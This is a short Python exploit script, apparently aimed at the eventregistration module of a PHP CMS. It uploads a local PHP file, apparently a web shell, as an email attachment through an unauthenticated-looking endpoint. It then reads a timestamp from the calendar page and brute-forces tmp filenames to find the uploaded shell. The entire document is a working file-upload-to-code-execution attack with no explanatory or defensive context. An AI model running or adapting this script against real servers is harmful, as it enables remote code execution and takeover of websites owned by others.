import requests
import re
domain_url = 'http://192.168.1.4'
tmp_url = f'{domain_url}/tmp'
base_url = f'{domain_url}/index.php'
upload_url = f'{base_url}?module=eventregistration&action=emailRegistrants&email_addresses=123456789@123.com&email_message=1&email_subject=1'
timestamp_url = f'{base_url}?module=eventregistration&action=eventsCalendar'
wbp = '1.php'
with open('1.php', 'r') as f:
    data = f.read()
    print(data)
files={'attach':open('1.php','rb')}
print(files)
requests.post(upload_url,files=files)
res = requests.get(timestamp_url)
t = int(re.search("History\\.push.+?rel:\\'(\d+)?\\'", res.text).group(1))
print(t)

for i in range(10000):
    try_url = f'{tmp_url}/{t-i}_{wbp}'
    res = requests.get(try_url)
    if res.status_code == 200:
        print(try_url)
        exit(0)
